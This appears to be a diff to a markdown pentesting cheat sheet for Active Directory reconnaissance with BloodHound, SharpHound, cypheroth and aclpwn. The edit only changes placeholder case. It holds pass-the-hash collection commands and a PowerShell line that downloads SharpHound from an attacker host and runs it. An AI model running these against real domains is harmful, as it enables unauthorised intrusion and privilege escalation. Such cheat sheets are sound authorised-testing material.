@@ -45,7 +45,7 @@ https://gitlab.com/kalilinux/packages/bloodhound-ce-python
 
 ```bash
 
-bloodhound-ce-python -d <domain> -u <user> -p '<password>' -c all -dc <dc-ip> -ns <nameserver> --zip
+bloodhound-ce-python -d <DOMAIN> -u <USER> -p '<PASSWORD>' -c all -dc <DC-IP> -ns <nameServer> --zip
 ```
 
 ## bloodhound - collect data auth with hashe
@@ -54,7 +54,7 @@ https://gitlab.com/kalilinux/packages/bloodhound-ce-python
 
 ```bash
 
-bloodhound-ce-python -d <domain> -u <user> --hashes '<hash>' -c all -dc <dc-ip> -ns <nameserver> --zip
+bloodhound-ce-python -d <DOMAIN> -u <USER> --hashes '<HASH>' -c all -dc <DC-IP> -ns <nameServer> --zip
 ```
 
 ## bloodhound - collect data (alternative)
@@ -63,7 +63,7 @@ https://gitlab.com/kalilinux/packages/bloodhound-ce-python
 
 ```bash
 
-bloodhound-ce-python -d <domain> -u <user> -p '<password>' -gc <global_catalog> -dc <domain_controler> -c all --zip
+bloodhound-ce-python -d <DOMAIN> -u <USER> -p '<PASSWORD>' -gc <global_catalog> -dc <domain_controler> -c all --zip
 ```
 
 ## sharphound - collect bloodhound data
@@ -73,7 +73,7 @@ https://github.com/SpecterOps/SharpHound
 ```powershell
 
 import-module sharphound.ps1
-invoke-bloodhound -collectionmethod all -domain <domain>
+invoke-bloodhound -collectionmethod all -domain <DOMAIN>
 ```
 
 ## sharphound - collect bloodhound data download and execute
@@ -82,7 +82,7 @@ https://github.com/SpecterOps/SharpHound
 
 ```powershell
 
-(new-object system.net.webclient).downloadstring('http://<lhost>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain>
+(new-object system.net.webclient).downloadstring('http://<LHOST>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <DOMAIN>
 ```
 
 ## cypheroth - start
@@ -93,7 +93,7 @@ https://github.com/seajaysec/cypheroth
 
 ```bash
 
-cypheroth -u <bh_user|neo4j> -p <bh_password|exegol4thewin> -d <domain>
+cypheroth -u <bh_user|neo4j> -p <bh_password|exegol4thewin> -d <DOMAIN>
 ```
 
 ## aclpwn - from computer to domain - dry run
@@ -104,7 +104,7 @@ https://github.com/fox-it/aclpwn.py
 
 ```bash
 
-aclpwn -f <computer_name> -ft computer -d <domain> -dry
+aclpwn -f <computer_name> -ft computer -d <DOMAIN> -dry
 ```
 
 
